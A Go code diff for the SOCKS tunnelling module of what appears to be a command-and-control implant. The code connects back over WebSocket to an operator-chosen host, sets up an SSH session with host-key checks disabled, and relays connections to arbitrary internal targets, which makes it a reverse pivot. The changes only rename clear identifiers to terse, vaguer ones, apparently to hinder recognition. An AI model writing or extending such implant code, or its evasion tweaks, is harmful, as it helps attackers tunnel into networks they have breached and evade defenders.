@@ -33,12 +33,12 @@ const (
 )
 
 
-type SocksCommand struct {
+type ProxyMsg struct {
 	wsConn          *websocket.Conn
 	sshConn         ssh.Conn
 	running         bool
 	mu              sync.RWMutex
-	activeTunnels   map[string]*TunnelInfo
+	activeTunnels   map[string]*ChannelInfo
 	tunnelsMu       sync.RWMutex
 	maxConnections  int
 	currentConns    int
@@ -47,15 +47,15 @@ type SocksCommand struct {
 }
 
 // getTpl safely retrieves a template string by index
-func (c *SocksCommand) getTpl(idx int) string {
+func (c *ProxyMsg) getTpl(idx int) string {
 	if c.tpl != nil && idx < len(c.tpl) {
 		return c.tpl[idx]
 	}
 	return ""
 }
 
-// TunnelInfo tracks active SOCKS tunnel connections
-type TunnelInfo struct {
+// ChannelInfo tracks active SOCKS tunnel connections
+type ChannelInfo struct {
 	Target       string
 	StartTime    time.Time
 	LastActivity time.Time
@@ -63,34 +63,34 @@ type TunnelInfo struct {
 	BytesRecv    int64
 }
 
-func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult {
+func (c *ProxyMsg) execute(ctx *OpCtx, args []string) OpResult {
 
-	// Get the JSON data from the CurrentCommand in context
+	// Get the JSON data from the CurrentMsg in context
 	var rawData string
 
 	ctx.mu.RLock()
-	if ctx.CurrentCommand != nil && ctx.CurrentCommand.Data != "" {
-		rawData = ctx.CurrentCommand.Data
+	if ctx.CurrentMsg != nil && ctx.CurrentMsg.Data != "" {
+		rawData = ctx.CurrentMsg.Data
 	}
 	ctx.mu.RUnlock()
 
 	if rawData == "" {
-		return CommandResult{
+		return OpResult{
 			Error:       fmt.Errorf(E32),
-			ErrorString: Err(E32),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EStr: Err(E32),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
 	// Parse socks config with merged template
 	var socksData struct {
 		Action      string `json:"at"`
-		SocksPort   int    `json:"sp"`
-		WSSPort     int    `json:"wp"`
-		WSSHost     string `json:"wh"`
-		Path        string `json:"path"`
-		Credentials struct {
+		SP   int    `json:"sp"`
+		WP   int    `json:"wp"`
+		WH   string `json:"wh"`
+		Path string `json:"path"`
+		CR   struct {
 			Username string `json:"un"`
 			Password string `json:"pw"`
 			SSHKey   string `json:"sk"`
@@ -102,11 +102,11 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 	}
 
 	if err := json.Unmarshal([]byte(rawData), &socksData); err != nil {
-		return CommandResult{
+		return OpResult{
 			Error:       err,
-			ErrorString: Err(E18),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EStr: Err(E18),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -132,8 +132,8 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 		// Build WebSocket URL using template format
 		wssFmt := c.getTpl(idxSocksWssFmt)
 		wsURL := fmt.Sprintf(wssFmt,
-			socksData.WSSHost,
-			socksData.WSSPort,
+			socksData.WH,
+			socksData.WP,
 			socksData.Path,
 		)
 
@@ -143,28 +143,28 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 				_, _ = io.ReadAll(resp.Body)
 				resp.Body.Close()
 			}
-			return CommandResult{
+			return OpResult{
 				Error:       err,
-				ErrorString: Err(E34),
-				ExitCode:    1,
-				CompletedAt: time.Now().Format(time.RFC3339),
+				EStr: Err(E34),
+				EC:    1,
+				Done: time.Now().Format(time.RFC3339),
 			}
 		}
 
 
 		// Configure SSH client
 		sshConfig := &ssh.ClientConfig{
-			User: socksData.Credentials.Username,
+			User: socksData.CR.Username,
 			Auth: []ssh.AuthMethod{
-				ssh.Password(socksData.Credentials.Password),
+				ssh.Password(socksData.CR.Password),
 			},
 			HostKeyCallback: ssh.InsecureIgnoreHostKey(),
 			Timeout:         10 * time.Second,
 		}
 
 		// Add SSH key authentication if provided
-		if socksData.Credentials.SSHKey != "" {
-			keyBytes, err := base64.StdEncoding.DecodeString(socksData.Credentials.SSHKey)
+		if socksData.CR.SSHKey != "" {
+			keyBytes, err := base64.StdEncoding.DecodeString(socksData.CR.SSHKey)
 			if err != nil {
 			} else {
 				signer, err := ssh.ParsePrivateKey(keyBytes)
@@ -181,11 +181,11 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 		sshConn, chans, reqs, err := ssh.NewClientConn(wrapped, "", sshConfig)
 		if err != nil {
 			wsConn.Close()
-			return CommandResult{
+			return OpResult{
 				Error:       err,
-				ErrorString: Err(E35),
-				ExitCode:    1,
-				CompletedAt: time.Now().Format(time.RFC3339),
+				EStr: Err(E35),
+				EC:    1,
+				Done: time.Now().Format(time.RFC3339),
 			}
 		}
 
@@ -195,7 +195,7 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 		c.wsConn = wsConn
 		c.sshConn = sshConn
 		c.running = true
-		c.activeTunnels = make(map[string]*TunnelInfo)
+		c.activeTunnels = make(map[string]*ChannelInfo)
 		c.maxConnections = 50 // Configurable limit
 		c.currentConns = 0
 		c.cleanupShutdown = make(chan struct{})
@@ -213,10 +213,10 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 		// Keep SSH connection alive (don't create a client that consumes channels)
 		go c.keepAlive(sshConn)
 
-		return CommandResult{
-			Output:      fmt.Sprintf("S8|%d", socksData.SocksPort),
-			ExitCode:    0,
-			CompletedAt: time.Now().Format(time.RFC3339),
+		return OpResult{
+			Output:      fmt.Sprintf("S8|%d", socksData.SP),
+			EC:    0,
+			Done: time.Now().Format(time.RFC3339),
 		}
 
 	case actionStop:
@@ -234,23 +234,23 @@ func (c *SocksCommand) Execute(ctx *CommandContext, args []string) CommandResult
 		c.running = false
 		c.mu.Unlock()
 
-		return CommandResult{
+		return OpResult{
 			Output:      Succ(S9),
-			ExitCode:    0,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    0,
+			Done: time.Now().Format(time.RFC3339),
 		}
 
 	default:
-		return CommandResult{
+		return OpResult{
 			Error:       fmt.Errorf(ErrCtx(E36, socksData.Action)),
-			ErrorString: ErrCtx(E36, socksData.Action),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EStr: ErrCtx(E36, socksData.Action),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 }
 
-func (c *SocksCommand) keepAlive(sshConn ssh.Conn) {
+func (c *ProxyMsg) keepAlive(sshConn ssh.Conn) {
 	keepaliveStr := c.getTpl(idxSocksKeepalive)
 
 	for {
@@ -284,7 +284,7 @@ func (c *SocksCommand) keepAlive(sshConn ssh.Conn) {
 
 // calculateKeepaliveInterval dynamically calculates keepalive interval
 // based on current sleep/jitter to adapt to agent callback rate
-func (c *SocksCommand) calculateKeepaliveInterval() time.Duration {
+func (c *ProxyMsg) calculateKeepaliveInterval() time.Duration {
 	// Default to 30 seconds for safety
 	const (
 		defaultInterval = 30 * time.Second
@@ -324,7 +324,7 @@ func (c *SocksCommand) calculateKeepaliveInterval() time.Duration {
 }
 
 // cleanupStaleTunnels periodically removes stale tunnel connections
-func (c *SocksCommand) cleanupStaleTunnels() {
+func (c *ProxyMsg) cleanupStaleTunnels() {
 	ticker := time.NewTicker(30 * time.Second)
 	defer ticker.Stop()
 
@@ -352,7 +352,7 @@ func (c *SocksCommand) cleanupStaleTunnels() {
 	}
 }
 
-func (c *SocksCommand) handleChannels(chans <-chan ssh.NewChannel) {
+func (c *ProxyMsg) handleChannels(chans <-chan ssh.NewChannel) {
 
 	for newChannel := range chans {
 		go c.handleChannelOpen(newChannel)
@@ -360,7 +360,7 @@ func (c *SocksCommand) handleChannels(chans <-chan ssh.NewChannel) {
 
 }
 
-func (c *SocksCommand) handleChannelOpen(newChannel ssh.NewChannel) {
+func (c *ProxyMsg) handleChannelOpen(newChannel ssh.NewChannel) {
 	directTcpStr := c.getTpl(idxSocksDirectTcpip)
 	unknownChanStr := c.getTpl(idxSocksErrUnknownChannel)
 	connLimitStr := c.getTpl(idxSocksErrLimitReached)
@@ -389,8 +389,8 @@ func (c *SocksCommand) handleChannelOpen(newChannel ssh.NewChannel) {
 
 	// Parse the forwarding request
 	var req struct {
-		DestAddr   string
-		DestPort   uint32
+		DA   string
+		DP   uint32
 		OriginAddr string
 		OriginPort uint32
 	}
@@ -400,8 +400,8 @@ func (c *SocksCommand) handleChannelOpen(newChannel ssh.NewChannel) {
 		return
 	}
 
-	// The DestAddr contains the target address (host:port)
-	target := req.DestAddr
+	// The DA contains the target address (host:port)
+	target := req.DA
 
 	// Connect to the target with timeout
 	targetConn, err := net.DialTimeout("tcp", target, 10*time.Second)
@@ -421,7 +421,7 @@ func (c *SocksCommand) handleChannelOpen(newChannel ssh.NewChannel) {
 	// Track this tunnel
 	connID := fmt.Sprintf("%s_%d", target, time.Now().UnixNano())
 	c.tunnelsMu.Lock()
-	c.activeTunnels[connID] = &TunnelInfo{
+	c.activeTunnels[connID] = &ChannelInfo{
 		Target:       target,
 		StartTime:    time.Now(),
 		LastActivity: time.Now(),
@@ -497,7 +497,7 @@ func (c *SocksCommand) handleChannelOpen(newChannel ssh.NewChannel) {
 }
 
 // copyWithTimeout copies data with timeout enforcement and activity tracking
-func (c *SocksCommand) copyWithTimeout(dst io.Writer, src io.Reader, connID string, isSend bool) (int64, error) {
+func (c *ProxyMsg) copyWithTimeout(dst io.Writer, src io.Reader, connID string, isSend bool) (int64, error) {
 	const (
 		bufferSize    = 32 * 1024 // 32KB buffer for efficient large file transfer
 		idleTimeout   = 5 * time.Minute
